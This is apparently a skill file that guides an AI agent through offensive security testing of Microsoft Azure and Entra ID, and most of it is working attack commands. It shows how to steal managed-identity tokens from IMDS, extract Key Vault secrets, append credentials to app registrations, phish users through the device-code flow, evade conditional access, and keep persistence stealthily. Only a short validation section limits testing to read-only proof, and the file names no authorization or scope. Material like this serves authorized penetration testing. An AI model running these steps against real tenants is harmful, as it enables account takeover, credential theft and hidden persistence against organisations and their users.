---
name: azure
description: Microsoft Azure and Entra ID security testing - managed identity IMDS abuse, service principal and app registration takeover, RBAC escalation, Storage/Key Vault exposure, and device-code phishing
---

# Azure Security Testing

Azure couples two distinct trust planes: the Entra ID (formerly Azure AD) identity plane that issues OAuth tokens for Microsoft Graph and ARM, and the Azure Resource Manager control plane that governs subscriptions, resource groups, and resources through RBAC. The seam between them is where most compromises live - an over-permissioned service principal, a managed identity reachable through SSRF, or an anonymous Storage container leaks credentials that the other plane trusts implicitly. Tokens are bearer tokens scoped per-resource (`https://graph.microsoft.com`, `https://management.azure.com`, `https://vault.azure.net`), so capturing one token rarely grants everything; capturing the right one grants the subscription. For SSRF-mediated managed identity token theft, see the ssrf skill.

## Attack Surface

**Scope**
- Entra ID tenant (users, groups, service principals, app registrations, conditional access)
- Azure Resource Manager (`management.azure.com`) - subscriptions, resource groups, RBAC assignments
- Instance Metadata Service (IMDS) at `169.254.169.254` reachable from any VM/container
- Storage accounts (Blob, File, Queue, Table) with public endpoints and SAS tokens
- Key Vault (`*.vault.azure.net`) holding secrets, keys, and certificates
- Automation Accounts, Function Apps, Logic Apps, and their managed identities
- Microsoft Graph (`graph.microsoft.com`) for directory and mailbox operations

**Entry Points**
- Compromised VM/container with a system- or user-assigned managed identity
- Leaked service principal credentials (client ID + secret/cert) in code, pipelines, or `.env`
- Anonymous or SAS-token-exposed Storage blobs containing connection strings
- Device-code phishing yielding a refresh token for a real user
- CI/CD federated credentials (GitHub OIDC, Azure DevOps service connections)

**Authentication and identity**
- Bearer tokens are audience-scoped JWTs; decode the `aud`, `scp`/`roles`, and `oid` claims to know what a token can do (see authentication_jwt)
- Managed identities never expose a secret - the VM trades its identity for a token at IMDS
- Service principals authenticate with a client secret, certificate, or federated credential
- Refresh tokens from interactive/device-code flows mint access tokens for any resource the user consented to (Family of Client IDs token exchange widens this further)

## Key Vulnerabilities

### Managed Identity via IMDS

Any process on an Azure VM or App Service instance can request an OAuth token for the attached managed identity from the non-routable IMDS endpoint. The request requires the `Metadata: true` header (anti-SSRF guard that browsers cannot set) and a `resource=` parameter naming the target audience. A token for `https://management.azure.com/` plus a permissive role assignment is full subscription control. This is the single highest-yield primitive when chained from SSRF.

**Test:**
```
# System-assigned identity, ARM-scoped token
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Graph and Key Vault audiences
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
# User-assigned identity: pin the client_id
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<uami-client-id>"
```

### Service Principals and App Registrations

Service principals are the non-human identities Azure trusts most. An attacker who can add credentials to an existing app registration (`Application.ReadWrite.All` or ownership) gains that app's effective permissions; apps holding Graph application permissions like `RoleManagement.ReadWrite.Directory` or `AppRoleAssignment.ReadWrite.All` are a direct path to Global Admin.

**Test:**
```
# Enumerate SPs, app registrations, and their API permissions
az ad sp list --all -o json | jq '.[] | {appId, displayName}'
az ad app list --all -o json | jq '.[] | {appId, displayName, requiredResourceAccess}'
# Add a new client secret to an app you own/control (persistence + reuse)
az ad app credential reset --id <appId> --append
# ROADrecon full directory dump for offline analysis
roadrecon auth -u user@tenant.onmicrosoft.com -p '<pass>'
roadrecon gather && roadrecon gui
```

### RBAC Privilege Escalation

Azure RBAC escalation hinges on roles that can grant roles or run code as a privileged identity. `Microsoft.Authorization/roleAssignments/write` (held by Owner and User Access Administrator) lets a principal assign itself Owner. `Microsoft.Compute/virtualMachines/runCommand/action` runs arbitrary commands as SYSTEM/root on a VM, inheriting that VM's managed identity.

**Test:**
```
# Current principal's effective assignments
az role assignment list --assignee <oid> --all -o table
# Hunt for assignment-write and runCommand rights across roles
az role definition list -o json | jq '.[] | select(.permissions[].actions[] | test("roleAssignments/write|runCommand|Microsoft.Authorization/.*/write")) | .roleName'
# Run code as the VM identity (then re-query IMDS)
az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript \
  --scripts "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"
# AzureHound collects RBAC + Entra graph for BloodHound
azurehound -u user@tenant -p '<pass>' list --tenant <tenantId> -o azurehound.json
```

### Storage Account Exposure

Blob containers set to `Blob` or `Container` public access level are readable without authentication; `Container` level additionally allows anonymous listing. SAS tokens (signed query strings) leak in URLs, logs, and client code, often with `sp=racwdl` (full) permissions and multi-year expiry. Connection strings in blobs expose the account key, which signs unlimited SAS tokens.

**Test:**
```
# Anonymous list/read against a guessed account+container
curl -s "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list"
curl -s "https://<account>.blob.core.windows.net/<container>/<blob>"
# Enumerate account/container names (MicroBurst)
Import-Module .\MicroBurst.psm1; Invoke-EnumerateAzureBlobs -Base <orgname>
# Inspect a leaked SAS token's permissions/expiry from its query params (sp, se, sig)
az storage blob list --account-name <account> --container-name <c> --sas-token "<sas>" -o table
```

### Key Vault Secret Extraction

A token with the `https://vault.azure.net` audience plus a Key Vault access policy or the RBAC `Key Vault Secrets User` role reads every secret in the vault. Managed identities are routinely granted vault access, so an IMDS token frequently unlocks database passwords, API keys, and certificate private keys.

**Test:**
```
# Using a vault-scoped token from IMDS
VTOK=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq -r .access_token)
curl -s -H "Authorization: Bearer $VTOK" "https://<vault>.vault.azure.net/secrets?api-version=7.4"
curl -s -H "Authorization: Bearer $VTOK" "https://<vault>.vault.azure.net/secrets/<name>?api-version=7.4"
# Or via CLI when already authenticated
az keyvault secret list --vault-name <vault> -o table
az keyvault secret show --vault-name <vault> --name <name> --query value -o tsv
```

### Device-Code Phishing

The OAuth device-code flow lets an attacker initiate authentication for a first-party client (e.g. Azure CLI app ID `04b07795-8ddb-461a-bbee-02f9e1bf7b46`), send the victim the short `user_code`, and poll for the resulting tokens. No password crosses the attacker, MFA is satisfied by the victim, and the returned refresh token mints tokens for Graph, ARM, and Office.

**Test:**
```
# Initiate device-code flow against a first-party client
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/devicecode" \
  -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default offline_access"
# Poll for the token after the victim enters the user_code at microsoft.com/devicelogin
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&device_code=<code>"
```

### Automation Account Runbooks

Automation Accounts execute PowerShell/Python runbooks under a Run As account or system-assigned managed identity, frequently scoped Contributor or Owner over the subscription. Permission to create or edit a runbook is arbitrary code execution as that high-privilege identity.

**Test:**
```
az automation account list -o table
az automation runbook list --automation-account-name <aa> -g <rg> -o table
# MicroBurst extracts Run As certs and runbook contents
Import-Module .\MicroBurst.psm1; Get-AzPasswords -Verbose
```

## Bypass Techniques

**Conditional Access evasion**
- Device-code and ROPC flows often escape CA policies that only target browser/SAML logins
- Spoof a compliant user-agent or trusted-network IP; legacy auth endpoints may skip MFA entirely
- Family-of-Client-IDs (FOCI) refresh tokens exchange one app's token for another's, sidestepping per-app consent

**Token audience pivoting**
- A refresh token mints access tokens for any resource the principal can reach - swap `resource=`/`scope=` to jump from Graph to ARM to Key Vault
- ARM tokens validate the audience, not the issuing flow, so an IMDS token is indistinguishable from an interactive one

**Stealthy persistence**
- Add a secondary client secret or certificate to an existing app registration rather than creating a new app
- Register attacker-controlled credentials as a federated identity credential (no secret to rotate)
- Consent-grant a malicious multi-tenant app to a user to retain Graph access after password reset

## Testing Methodology

1. **Identify the identity** - decode any captured token (`aud`, `scp`, `roles`, `oid`, `tid`); run `az account show` if a CLI context exists
2. **Pull IMDS** - on any compromised compute, request ARM, Graph, and Vault tokens from `169.254.169.254`
3. **Enumerate the directory** - ROADrecon/AzureHound dump users, SPs, app permissions, and role-eligible members
4. **Map RBAC** - list role assignments and definitions; flag `roleAssignments/write`, `runCommand`, and `*/write` on Authorization
5. **Sweep storage** - MicroBurst blob enumeration; test anonymous container listing and inspect leaked SAS scopes
6. **Raid Key Vault** - use vault-audience tokens to list and read secrets, keys, and certificates
7. **Hunt code execution** - VM runCommand, Automation runbooks, Function App deployment as managed identities
8. **Escalate and persist** - chain SP credential addition, role self-assignment, or app consent for durable access
9. **Graph the attack path** - load AzureHound output into BloodHound to find the shortest path to Global Admin/Owner

## Validation

1. Decode the captured token and confirm its `aud` and `roles`/`scp` claims match the access you intend to claim
2. Make one read-only authenticated call (`az account show`, Graph `/me`, vault secret list) to prove the token is live
3. For RBAC escalation, show the role definition contains the dangerous action - do not actually assign the role in production
4. For storage, show anonymous read returning real content, or decode the SAS query string (`sp`, `se`) to prove its scope
5. For runCommand/runbook RCE, return a benign command's output (`whoami`, identity token) rather than altering state

## False Positives

- IMDS reachable but returning `400`/`404` - no managed identity is assigned to the instance
- A token obtained but its `roles`/`scp` claims are empty or read-only, granting nothing actionable
- Storage container marked public but containing only static web assets intended to be public
- SAS token present but already expired (`se` in the past) or scoped read-only to a single innocuous blob
- Service principal with many API permissions that are all delegated (require a signed-in user) rather than application permissions

## Impact

- Full subscription takeover via managed identity + permissive RBAC or self-assigned Owner
- Tenant compromise (Global Admin) through app registrations holding privileged Graph permissions
- Credential and secret theft from Key Vault, Storage connection strings, and Automation Run As accounts
- Persistent backdoor access via added SP credentials, federated identities, or malicious app consent
- Lateral movement across subscriptions and into hybrid/on-prem via Entra Connect and seamless SSO
- Mass data exfiltration from anonymously exposed or SAS-leaked Storage accounts

## Pro Tips

1. Always decode the token before acting - the `aud` claim tells you which API it works against and avoids wasted, noisy calls
2. One IMDS token per audience: request ARM, Graph, and Vault separately; a single resource won't cover all three
3. `Microsoft.Compute/.../runCommand/action` is the cleanest pivot from ARM rights to OS-level code under the VM's identity
4. Refresh tokens are the prize in device-code phishing - they outlive access tokens and mint new audiences on demand
5. Run AzureHound + BloodHound early; the shortest-path query surfaces escalation chains that manual RBAC review misses
6. Storage account names are globally unique and guessable - brute the `<org>blob/storage/backup` namespace before assuming nothing is exposed
7. Application permissions (`roles` claim) are far more dangerous than delegated ones (`scp` claim) because they need no signed-in user
8. Stormspotter and ROADrecon visualize the same data differently - ROADrecon excels at app/SP permission auditing offline
9. Check `az account list` for multiple subscriptions; a low-priv identity in one may be Owner in a forgotten dev subscription

## Summary

Azure compromises chain across its two trust planes: an IMDS-reachable managed identity or a leaked service principal yields a bearer token, the token's audience and role claims decide whether it touches ARM, Graph, or Key Vault, and one privileged claim (role-assignment write, runCommand, or a directory-write Graph permission) converts that foothold into subscription or tenant ownership. Decode tokens first, enumerate identity and RBAC with ROADtools/AzureHound, raid Storage and Key Vault for secondary credentials, and graph the path to Global Admin rather than chasing isolated findings. Persistence is cheap - a second app secret or a malicious consent grant survives the obvious remediations.
